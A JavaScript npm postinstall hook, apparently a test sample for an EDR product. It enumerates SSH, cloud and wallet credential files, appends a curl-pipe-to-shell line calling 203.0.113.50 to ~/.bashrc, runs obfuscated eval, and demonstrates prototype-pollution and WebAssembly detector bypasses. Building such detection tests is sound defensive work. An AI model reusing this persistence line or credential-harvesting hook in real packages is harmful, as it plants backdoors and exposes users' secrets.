/**
 * postinstall lifecycle hook — Credential harvesting + persistence.
 *
 * !! TEST ARTIFACT FOR KOJUTO EDR VALIDATION !!
 * !! DO NOT PUBLISH TO npm !!
 *
 * TTPs exercised:
 *   - SSH/cloud credential harvesting (credential_access)
 *   - Crypto wallet harvesting (credential_access)
 *   - .bashrc persistence injection (persistence)
 *   - eval/Function dynamic code execution (dynamic_code_execution)
 */

'use strict';

const fs = require('fs');
const path = require('path');
const os = require('os');

const home = os.homedir();

// --- Credential harvesting ---

function readCredentials() {
  const targets = [
    path.join(home, '.ssh', 'id_rsa'),
    path.join(home, '.ssh', 'id_ed25519'),
    path.join(home, '.aws', 'credentials'),
    path.join(home, '.git-credentials'),
    path.join(home, '.netrc'),
    path.join(home, '.config', 'gh', 'hosts.yml'),
    path.join(home, '.docker', 'config.json'),
  ];

  for (const target of targets) {
    try { fs.readFileSync(target, 'utf8'); } catch (_) {}
  }
}

// --- Crypto wallet harvesting ---

function readWallets() {
  const targets = [
    path.join(home, '.solana', 'id.json'),
    path.join(home, '.ethereum', 'keystore'),
    path.join(home, '.bitcoin', 'wallet.dat'),
    path.join(home, '.electrum', 'wallets', 'default_wallet'),
    path.join(home, '.exodus', 'exodus.wallet'),
    path.join(home, '.atomic', 'Local Storage', 'leveldb'),
    path.join(home, '.config', 'solana', 'cli', 'config.yml'),
  ];

  for (const target of targets) {
    try { fs.readFileSync(target, 'utf8'); } catch (_) {}
  }
}

// --- Persistence via .bashrc ---

function persistence() {
  try {
    const bashrc = path.join(home, '.bashrc');
    fs.appendFileSync(bashrc,
      '\n# systemd-helper\n' +
      'curl -s http://203.0.113.50:8443/update.sh | sh\n'
    );
  } catch (_) {}
}

// --- Dynamic code execution (audit hook validation) ---

function dynamicExec() {
  // 1. eval — kojuto-require.js should intercept this.
  try {
    const encoded = Buffer.from(
      'cmVxdWlyZSgiZnMiKS5yZWFkRmlsZVN5bmMoIi9ldGMvaG9zdG5hbWUiLCAidXRmOCIp'
    , 'base64').toString();
    // Decodes to: require("fs").readFileSync("/etc/hostname", "utf8")
    eval(encoded);
  } catch (_) {}

  // 2. Function constructor — indirect eval.
  try {
    const fn = new Function('os', 'return os.hostname()');
    fn(os);
  } catch (_) {}

  // 3. vm.runInNewContext — sandbox escape pattern.
  try {
    const vm = require('vm');
    vm.runInNewContext('typeof process !== "undefined" && process.env.AWS_SECRET_ACCESS_KEY', {});
  } catch (_) {}
}

// --- Boundary tests: novel bypass techniques ---

// [BYPASS candidate] WebAssembly RWX — same V8 filter, different intent.
//
// V8 JIT and WebAssembly share the RWX page management path in Node.
// Kojuto's V8 JIT filter passes any simultaneous-RWX mprotect/mmap
// from a node process launched from a trusted directory. That means
// a WebAssembly module compiled at install time can execute payload
// bytes through the same RWX pages that legitimate JIT uses — the
// filter cannot distinguish "V8 compiling JavaScript" from
// "V8 compiling attacker-supplied wasm".
//
// This test compiles a minimal wasm module that returns 42. Real
// exploitation would use wasm's linear memory + imported functions
// to reach the outer host; the mechanism (V8 dropping RWX pages)
// is identical either way.
function wasmRwxViaV8() {
  try {
    // Minimal valid wasm binary — module with one exported function
    // that returns i32 constant 42.
    const wasmBytes = new Uint8Array([
      0x00, 0x61, 0x73, 0x6d, // magic \0asm
      0x01, 0x00, 0x00, 0x00, // version 1
      0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f, // type section: () -> i32
      0x03, 0x02, 0x01, 0x00, // function section
      0x07, 0x05, 0x01, 0x01, 0x66, 0x00, 0x00, // export "f" -> func 0
      0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x2a, 0x0b, // code: i32.const 42; end
    ]);
    // Compilation + instantiation drops RWX pages inside V8, indistinguishable
    // from ordinary JIT allocation to the analyzer.
    const mod = new WebAssembly.Module(wasmBytes);
    const inst = new WebAssembly.Instance(mod, {});
    inst.exports.f();
  } catch (_) {}
}

// [BYPASS candidate] Prototype pollution — install-time global hijack.
//
// Poisons Object.prototype so that subsequent property lookups on
// any object trigger attacker code. The `preinstall` hook runs, no
// obvious harm-firing syscall is emitted, kojuto records the postinstall
// dynamicExec events at LOW and moves on. The harm fires the first
// time some other package's code does `obj.toString()` — after the
// scan is complete.
//
// Real-world: CVE-2019-10744 (lodash), CVE-2021-25749 (madge). These
// have been used in supply-chain attacks where a transient dependency
// pollutes prototypes and a much later hot-path property access
// invokes the payload.
//
// Kojuto's audit hook DOES intercept the assignment IF it goes through
// eval/Function/vm — but a plain assignment to Object.prototype does
// not touch those paths. This tests whether the mere pollution is
// detected (expected: no).
function prototypePollution() {
  try {
    // The pollution itself.
    Object.prototype.__probe_alpha_hook__ = function () {
      // In a real attack: send credentials via network.
      // Here: just set an env var so the "harm" is observable but harmless.
      process.env.PROBE_NPM_POLLUTION_FIRED = '1';
    };
    // Trigger it once to demonstrate the mechanism works. Under
    // realistic conditions the trigger fires much later, outside
    // the scan window.
    ({}).__probe_alpha_hook__();
  } catch (_) {}
}

// --- Execute ---
readCredentials();
readWallets();
persistence();
dynamicExec();
wasmRwxViaV8();
prototypePollution();
